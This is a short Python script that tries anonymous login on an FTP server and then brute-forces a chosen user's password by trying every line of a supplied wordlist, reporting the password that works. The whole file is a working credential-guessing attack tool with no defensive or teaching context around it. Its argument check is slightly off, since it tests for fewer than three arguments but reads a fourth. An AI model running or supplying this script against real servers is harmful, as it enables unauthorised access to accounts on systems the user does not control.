import ftplib
import sys

def anonCheck(host):
    try:
        ftp = ftplib.FTP(host) 
        ftp.login('anonymous')
        print('Anonymous login successful')
        ftp.quit()
        return True
    except Exception:
        print('Failed to login')
        return False

def tryLogin(user, host, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, password)
        print('Login successful with', password)
        ftp.quit()
        sys.exit()
    except Exception:
        pass

def bruteForce(host, user, passwordList):
    passwordList = open(passwordList, 'r')
    passwords = passwordList.readlines()
    for password in passwords:
        password = password.strip()
        tryLogin(user, host, password)


if len(sys.argv) < 3:
    print('Not enough arguments, pass hostname, username & directory location')
    exit()
else:
    anonCheck(sys.argv[1])
    bruteForce(sys.argv[1], sys.argv[2], sys.argv[3])
